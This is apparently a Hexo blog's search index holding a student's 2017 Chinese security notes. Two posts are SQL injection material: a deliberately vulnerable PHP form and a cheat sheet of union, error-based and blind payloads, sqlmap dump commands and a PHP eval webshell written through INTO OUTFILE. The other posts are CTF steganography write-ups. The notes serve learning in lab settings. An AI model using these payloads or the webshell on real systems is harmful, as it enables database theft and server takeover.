<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[前端验证sql]]></title>
    <url>%2F2017%2F08%2F25%2F%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81sql%2F</url>
    <content type="text"><![CDATA[夜如何其？夜未央 写了一个前端验证，html也忘记了，页面写的很粗略，将就看一下，毕竟是我人生第一个自己写的漏洞。 主界面，省略掉测试他是否有漏洞。 id处输入： 1’ or 1=1# 省略中间步骤，直接爆一下东西： 输入：1’ and 1=2 union select 1,2,group_concat(username,0x3a,password) from user# 这里贴一下我的代码： &lt;html&gt; &lt;head&gt; &lt;title&gt;M3tar的第一个注入&lt;/title&gt; &lt;meta http-equiv=&quot;content-type&quot;content=&quot;text/html&quot;charset=&quot;Unicode&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;M-star.php&quot; method=&quot;post&quot;&gt; &lt;h1&gt;Sql注入&lt;/h1&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;id&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;id&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;用户名&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;密 码&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;reset&quot; value=&quot;重置&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php if($_POST){ $con=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;); mysql_select_db(&quot;m3tar&quot;,$con); $id = $_POST[&apos;id&apos;]; $sql=&quot;select * from user where id=&apos;$id&apos;&quot;; $query=mysql_query($sql,$con); $arr=mysql_fetch_array($query, MYSQL_ASSOC); if(!empty($arr)){ echo &apos;&lt;pre&gt;&apos;,print_r($arr,1),&apos;&lt;/pre&gt;&apos;; }else{ echo &quot;输入有误&quot;; } } ?&gt; 关于写代码学到的一点点心得： 1）php：写这个还是要对php有那么一点点的了解，对于数据库编程的内容也要有一些了解： 数据库的三层结构：客户端 mysql dbms 数据对象 2）可以总结一下mysql扩展库操作mysql数据库的步骤 3）关于phpstudy的理解： 以前只是下了phpstudy，知道往WWW下扔东西，才知道还可以秒切换版本，很不错的功能，希望以后能多加应用。因为写一==这个个简单的sql注入漏洞的界面，emmm，很难受，写不来数据库，百度了半天，很瓜，原来phpstudy里面就可以新建数据库（phpMyadmin、Mysql-front），赶紧照着百度依葫芦画瓢，第一次接触这个自己后台的数据库，非常的兴奋。还有其他问题，现在还没有怎么遇到，以后再补充。 4)html和css感觉白学了，都记不得了，要抓紧时间补足啊。 5）POST和GET参数分别的优势和劣势 http://www.cnblogs.com/hyddd/archive/2009/03/31/1426026.html 详细的可以看这个资料]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>sql学习</tag>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基础sql总结]]></title>
    <url>%2F2017%2F08%2F25%2F1%2F</url>
    <content type="text"><![CDATA[我与世界相遇，我自与世界相蚀，我自不辱使命，使我与众生相聚。摘要：总结一些基础的sql语句。 SQL注入原理&nbsp;&nbsp;它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 SQL注入分类&nbsp;&nbsp;sql注入分类主要还是分为数字型注入和字符型注入。至于说的post注入，cookie注入，http头注入，盲注···个人觉得都是可以分开囊括在里面的，只是这些是根据注入字段在的位置进行的命名。 下面就讲一些学到现在我见过的的注入分类吧。 GET注入 POST注入 http头注入 cookie注入 报错的注入 布尔盲注 基于时间的盲注 注入基本操作 （GET注入为例）第一步：判断是否存在注入GET注入一般看源代码就可以看到。形如：$_GET[“ID”] ID就是参数 以id为例： 1） url ? id=1 返回正常 2） url ? id=1’ 出错，页面异常 3） url ? id=1 and 1=1 返回正常 4） url ? id=1 and 1=2 返回错误 以上步骤满足，可能存在SQL注入漏洞 总结： 出现过的SQL语句总结： （不构造那种双闭合语句，一定记得注释 –+ 或者 #） 1）select * from table where id = &apos;input&apos; 2) select * from table where id = (&apos;input&apos;) 3) select * from table where id = (&quot;input&quot;) 4) select * from table where id = (input) 第二步： 找到注入点，进行基础的sql语句尝试：（以下是用GET注入为例的） 第一步：用 order by 来爆字段数，如果没有反应，则在后面加–+或者/*或者#注释掉后面的内容 http://127.0.0.1/sqli/sqli-labs-master/Less-1/?id=1&apos;)) order by 5 --+ 第二步：显示错误位，and 1=2 union select 1,2,3,4,5,6，…..（这一步一定记得前面必须输入错误的，才能爆出敏感信息） http://127.0.0.1/sqli/sqli-labs-master/Less-1/?id=-1&apos; union select 1,2,3--+ 爆库:select SCHEMA_NAME from information_schema.SCHEMATA limit 5,1 第三步：显示版本，当前用户，数据库路径， 1） and 1=2 union select 1,2,group_concat(version(),0x3a,user(),0x3a,@@datadir),4 2） and 1=2 union select 1,2,database() 第四步：爆表 and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ 第五步：爆列 and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &apos;表名的hex&apos; （&apos;users&apos;）--+ 第六步： 爆字段 and 1=2 union select 1,2,group_concat(username,0x3a,password) from 表名 (不用单引号）--+ POST注入 解决方式：burpsuite + sqlmap最简单的比如：前端验证， 直接绕过即可 这里详细讲述一下利用sqlmap解决的办法： 1）抓包，最后一行就是参数值sqlmap -u &quot;url&quot; --data &quot;参数（就是最后一行）&quot; --risk=3 --level=5 --dbs 2）将抓包得到的post请求复制为txt 注意：在kali里面新建文件夹后使用vim vim使用方法： vim 1.txt 回车 粘贴内容 esc键:wq 回车 运行sqlmap并使用如下命令（ 括号里面可以不写 ）： ./sqlmap -r search-1.txt (-p 参数) 或者： sqlmap -r &quot;1.txt&quot; -p &quot;参数&quot; --dbs 这里参数 -r 是让sqlmap加载我们的post请求1.txt，而-p 应该比较熟悉，指定注入用的参数(如果没写，就会自己检测的) 3）自动搜索表单sqlmap -u url --forms HTTP头注入基本上http头都有可能出现能注入的地方。推荐阅读这个链接http头注入 cookie注入cookie注入，这里主要讲解一下利用sqlmap，因为手工的cookie注入，现在我还没遇到，遇到之后在做补充。 基本用法：&nbsp;&nbsp;这里要进行cookie注入，就要先注册，然后F12 就出现一个cookies 就可以进行cookie注入 相关语句 网上的相关资源 命令1跑表 sqlmap -u &quot;url&quot; --cookie &quot;参数&quot; --table --level 2 命令2字段 sqlmap -u &quot;URL&quot; --cookie &quot;参数&quot; --columns -T 表段 --level 2 命令3跑密码 sqlmap -u &quot;url&quot; --cookie &quot;参数&quot; --dump -T 表段 -C “字段，字段” --level 2 报错的注入步骤1)猜测注入语句，不再赘述. 2)语句测试，当使用 1’union selcet 1,2,3 –+ 返回还是正常页面，因此我们要利用报错信息 3) 1′ and ( select 1 from (select count(),concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))name from information_schema.tables group by name)b)–+ 含义：取名concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))为name，count()name的个数，这时候会报错，从而爆出database()的值，’~’的用途在于方便识别。 整个语句分析： 整体相当于select 1 from b； 其中b = select count(),concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))name from information_schema.tables group by name ，count()name的个数； name=concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2)) 4） 进行注入 语句构造： 1′and (select 1 from (select count(),(concat(“~”,(select 报错语句),”~”,floor(rand()2)))name from information_schema.tables group by name)b) 解释语句 floor() 是取整数 rand()在0和1之间产生一个随机数 rand(0)*2 将取0到2的随机数 floor(rand()*2)有两条记录就会报错 floor(rand(0)*2) 记录需为3条以上，且3条以上必报错，返回的值是有规律的 count(*) 是用来统计结果的，相当于刷新一次结果 group by 在对数据进行分组时会先看看虚拟表里有没有这个值，没有的话就插入存在的话count(*)加1 在使用group by时floor(rand(0)*2)会被执行一次，若虚表不存在记录，插入虚表时会再执行一次 个人常用的基于错误的语句1./*爆表库*/(select 1 from (select count(*),(concat(“~”,(select table_name from information_schema.tables where table_schema=database() limit 0,1),”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆表库*/ 2./*爆当前(select 1 from (select count(*),(concat(“~”,current_user,”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆当前用户名*/ 3./*爆所有用户名*/(select 1 from (select count(*),(concat(“~”,(select username from users limit 0,1),”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆所有用户名*/ 布尔盲注1)布尔盲注出现的情况当出现无论输入任何语句页面只有两种情况的时候，即只存在正确页面和错误页面时，而不显示报错信息，这样我们就需要进行布尔盲注。通过猜测目标字符串字符的ascii码来确定字符，但该过程非常繁琐，自动化工具更方便一些。 2)语句构造1’ and (ascii(substr(database(),1,1)))&gt;100 –+ 返回正确页面说明该范围正确，返回错误页面相当于范围不正确，最后用等号确定。 基于时间的盲注1)基于时间的盲注出现的情况这种情况下就是所有语句下页面只存在正确的一种，这样就用到了基于时间的盲注，原理是如果正确就执行sleep()函数，使程序挂起，这样我们就可以知道语句正确还是错误了。一般使用sleep(5)，使程序挂起5秒钟。 2)语句构造1′ and (select if (ascii(substr(database(),1,1))&gt;100,sleep(5),NULL)) –+ 数据库名称第一个字符的ascii码是否大于100，正确则产生5s的延迟，错误则返回空。通过这样database()可用查询信息替换，以此来爆出表名列名数据等等。 也有benchmark()延时注入，与sleep用法相似。 其他一句话提权等直接写一句话(要知道物理路径) ，连接菜刀 and 1=2 union select 1,2,&apos;&lt;?php @eval($_post[&quot;mima&quot;]) ?&gt;&apos;,4 into outfile &apos;D:\\xampp\\www\\test.php&apos; --+ 记住一定要用两个反斜杠，用一个的话可能会出现转义 中间插入如果强行要在1，**，3中插入 语句这样构造： 爆表： id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;database&apos; --+ 一些语句的解释1.group_concat的意思是全部列出来 2.version()——MySQL版本 3.concat(str1,str2…)——没有分隔符地连接字符串 4.concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串 5.group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据 6.0x3a是”:”的十六进制，在这里把它作为分隔符]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>sql学习</tag>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[png图片隐写]]></title>
    <url>%2F2017%2F08%2F22%2F1%2F</url>
    <content type="text"><![CDATA[前尘隔海，古屋不再。 &nbsp;&nbsp;这是之前做一道图片隐写题目学到的东西，补充一下之前的写图片隐写术。 考察内容1.LSB隐写 2.图片修复题目图片 知识储备扔一下相关学习的网站： 世安杯-LSB隐写-png：http://blog.csdn.net/fuzz_nancheng/article/details/53384353?locationNum=4&amp;fps=1 CTF之隐写：http://www.jianshu.com/p/02fdd5edd9fc 隐写术总结：http://bobao.360.cn/learning/detail/243.html stegsolve的用法：Stegsolve——Analyse——Frame Browser。浏览每个颜色通道的每一位，看是否隐藏了二维码（二维码在线解码：http://tool.chinaz.com/qrcode/） Stegsolve——Analyse——Data Extract。这个是使用ASCII隐写的时候可以查看的。 Stegsolve——Analyse——file format。查看文件格式，结合IDAT结构是否异常，结合编程。 Stegsolve——Analyse——frame browser。可以查看GIF文件每一帧的图片。 Stegsolve——Analyse——image combiner双图分析 LSB隐写&nbsp;&nbsp;这个题学到很多知识。简述一下，先看到提示，最低最低位，最开始跑偏了，想成了图片缺失，在最低位出现flag，后来改了像素，变成了另外一张图片，（当时的启发由于这个网站：http://www.jianshu.com/p/02fdd5edd9fc） 后来出现的图片出现了类似像素的东西，就很丑，，然后也不会了，再看一下，是一个png图片，考虑扔进stegsolve看一下，最低位， 隐约间看到了key:paaaasword LSB &nbsp;&nbsp;哎呦喂，以为出来了，看到hint，秘密之所以是秘密，因为秘密需要秘密去探寻，就考虑里面怕是有txt，LSB隐写，喜极而泣的在kali里面搞啊搞（搞的方法是：使用一个github上一个工具来处理-cloacked-pixel(具体用法见https://github.com/cyberinc/cloacked-pixel)。 &nbsp;&nbsp;我在kali下进行测试的。先将文件解压，并将png文件放进去，在命令行下进入到该文件夹。），密码试了7次（可能不止，还有自己输错的），最后密码是 ： paaaasword大概是在kali里面这样的情况： &nbsp;&nbsp;然后使用命令python lsb.py extract misc2.png 111.txt paaaassword可以得到隐写的文件111.txt。 ps:extract指的是提取misc2.png指的是导入文件名111.txt指的是导出文件名paaaasword指的是密码（此处根据提示猜测） &nbsp;&nbsp;当然，我天真的以为，txt里面就是我心心念念的flag，打开，试了的所有txt都是乱码， 图片修复我猜里面还有一个图片，winhex打开，看一下文件头， &nbsp;&nbsp;啧，和这个png很像嘛，百度一下文件头，http://www.jianshu.com/p/02fdd5edd9fc文件怕是损坏了，修复出来，编辑——粘贴字节8， 改后缀，png，看到曙光了，是个二维码， &nbsp;&nbsp;哇，兴奋的搓手手，赶紧在线解密， ，啥，识别不出来，用手机，还是识别不出来，哇，对比一下正常的二维码，定位点呢，定位点不对啊。搞到ps里面，emmm，截图成四块，第四块好像有一个反向，再拼起来，扫一下，终于对了。 做出来之后的我 本来还想打爆出题人，但是现在已经没有力气了。不过真的学到很多，嘻嘻嘻~]]></content>
      <categories>
        <category>CTF-Misc</category>
      </categories>
      <tags>
        <tag>CTF-Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图片隐写术总结]]></title>
    <url>%2F2017%2F08%2F21%2F1%2F</url>
    <content type="text"><![CDATA[大鹏一日同风起，扶摇直上九万里一直比较喜欢做杂项（虽然还是很垃圾），就感觉很有意思。总结了一些关于图片隐写的姿势，一起学习~ 1.另存为图片 （还有直接看文件信息，可能就在文件信息里面） 2.改后缀 zip / rar /txt3.扔winhex 这里要看文件头和文件结束的位置 Jpg文件头：FFD8FF，结尾都是FF D9 gif的开头是GIF8（47494638） PNG (png)，文件头：89504E47 ZIP Archive (zip)，文件头：504B0304 RAR Archive (rar)，文件头：52617221 …… 这是一些文件头标志的网站：http://www.cnblogs.com/mq0036/p/3912355.html 4.修复文件 5.分离图片：扔binwalk #binwalk 2.jpg 找到偏移位置 #dd if=2.jpg of=1.jpg skip=偏移位置 bs=1 if是指定输入文件，of是指定输出文件， skip是指定从输入文件开头跳过XXX(140147)个块后再开始复制， bs设置每次读写块的大小为1字节 。 还可以使用foremost 分离命令： #foremost 2.jpg 他会分离之后自己储存到一个ouput的文件夹，里面就有出现的分离图片 6.谷歌识图，百度识图 7.png图片 ①可能还会有图片要拉长一些 ②看低位（stegsolve） 8.base 64 转化成为图片 http://www.tuicool.com/articles/VviyAfY CTF图片隐写术http://www.jianshu.com/p/02fdd5edd9fc CTF隐写总结 （有png相关题目）]]></content>
      <categories>
        <category>CTF-Misc</category>
      </categories>
      <tags>
        <tag>CTF-Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[音频隐写 MP3stego+wav隐写+题目]]></title>
    <url>%2F2017%2F08%2F20%2F%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99-MP3stego-wav%E9%9A%90%E5%86%99-%E9%A2%98%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[所谓高贵的灵魂，即对自己怀有敬畏之心摘要： 音频隐写，遇见的比较少，这里总结一下我遇见过的一些关于音频隐写的题目，以后遇见其他类型的，再进行补充。 这是最简单的那种&nbsp; 当年年少无知，也不知道很多厉害的姿势，就直接把歌曲输入了网易云，把歌手或者专辑找出来了，然后直接提交flag MP3stego1.知识储备关于MP3stego用法：http://blog.csdn.net/sinat_38134380/article/details/69789665 2.题目分析 1）下载MP3stego 2）将需要分析的mp3文件拖到Decode.exe所在的目录，如 下面的sycgeek-mp3.mp3 3） 开始运行cmd，进入有mp3stego的磁盘 4）-X是获取隐藏的东西 -P后面写密码 5）会在该目录下生成一个新的txt文档sycgeek-mp3.mp3.txt，打开 wav隐写1.知识储备wav隐写-Audacity–silenteye1）-打开wav文件，Audacity-效果-反向-播放2）-Audacity-文件名-频谱图3）-声道里面夹杂着莫斯密码，短的代表’.’,长的代表’-’4）-Audacity-频谱图-attach-点击频谱-然后点击修改spectrogram setting，把8000改为480005）-电话音分析（http://dialabc.com/sound/detect/） 2.相关资源这里再贴上两个有关的wav题目隐写的做法：http://www.sohu.com/a/116298237_468673http://www.hackdig.com/08/hack-38263.htm 3.题目分析下面写一个我自己遇见的关于wav题目的隐写姿势 链接: https://pan.baidu.com/s/1eS7s8iY密码: 53dv 分析此题：首先把这个题扔到Audacity里面，因为很容易就能听出来他有问题，就考虑看一下频谱图（当然还可以看音频轨道、效果、高音、音频波形），考虑是不是数字隐藏。这个题，把中间的灰色的放大放大，放大 emmm ，经过百度，这里有很多种加密，除了上面列举的根据波形图的0 1 加密，摩斯电码加密，我自己在做这个题的时候，还考虑了粗细会不会是表示0 1，还有条形码，经过放大，然后画下来，笔头是个好东西，这是个密码呀~，嘻嘻嘻，很简单了吧，猪圈密码。最后还要考虑一下密码的大小写哦~ 真是个磨人的小妖精~ Flag: D0g3{ahhhhhhhhh}]]></content>
      <categories>
        <category>CTF-Misc</category>
      </categories>
      <tags>
        <tag>CTF-Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2017%2F08%2F18%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
